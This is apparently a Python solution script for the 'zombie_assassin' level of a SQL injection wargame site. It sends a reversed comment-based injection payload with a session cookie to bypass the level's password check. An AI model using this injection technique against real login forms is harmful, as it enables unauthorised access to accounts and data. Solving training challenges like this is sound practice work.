import requests

url = 'https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = f'?id="&pw= -- 1 ro'

r = requests.get(url + payload, cookies=cookie)
if 'ZOMBIE_ASSASSIN Clear!' in r.text:
    print('ZOMBIE_ASSASSIN Clear!')
